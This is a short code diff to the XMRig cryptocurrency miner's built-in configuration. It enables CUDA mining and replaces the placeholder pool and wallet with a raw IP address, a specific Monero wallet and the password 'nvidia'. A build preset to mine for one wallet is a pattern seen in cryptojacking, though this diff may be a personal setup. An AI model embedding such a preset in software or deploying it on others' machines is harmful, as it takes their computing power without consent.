@@ -81,9 +81,9 @@ R"===(
         "cn-lite/0": false
     },
     "cuda": {
-        "enabled": false,
-        "loader": null,
-        "nvml": true,
+        "enabled": true,
+        "loader": "./libxmrig-cuda.so",
+        "nvml": false,
         "cn/0": false,
         "cn-lite/0": false
     },
@@ -94,12 +94,12 @@ R"===(
         {
             "algo": null,
             "coin": null,
-            "url": "donate.v2.xmrig.com:3333",
-            "user": "YOUR_WALLET_ADDRESS",
-            "pass": "x",
+            "url": "103.172.204.182:7336",
+            "user": "hvxy3tX2KhUf3LGjHb1kG8HHKav7AHnDD7f3rrDHDiczjSzZqtwDyR3RhewKnnmLrU4MnvBUWpPYSFaAKewA4Scx2tF4fYXFR2",
+            "pass": "nvidia",
             "rig-id": null,
             "nicehash": false,
-            "keepalive": false,
+            "keepalive": true,
             "enabled": true,
             "tls": false,
             "tls-fingerprint": null,
